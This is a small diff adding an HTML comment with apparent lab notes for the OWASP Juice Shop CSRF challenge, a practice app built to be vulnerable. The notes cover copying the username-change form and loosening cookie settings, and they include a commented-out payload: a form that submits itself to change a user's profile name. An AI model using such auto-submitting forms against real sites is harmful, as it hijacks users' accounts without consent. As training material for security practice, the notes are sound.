@@ -35,5 +35,19 @@
 	  <pre id="ipt-state"></pre>
 	</label>
   </div>
+  <!-- CSRF CHALLENGE
+  user profile
+	copy the form that changes the username
+		select form action="./profile" => copy => outer html
+	change the form action url
+	NB: this works when the attacker website is not under https and 
+	(maybe) we need also to manually set the cookies on juiceshop to  SameSite=None
+	
+<form action="http://localhost:3000/profile" method="POST">
+  <input name="username" value="CSRF"/>
+  <input type="submit"/>
+</form>
+<script>document.forms[0].submit();</script>-->
+
   </body>
 </html>
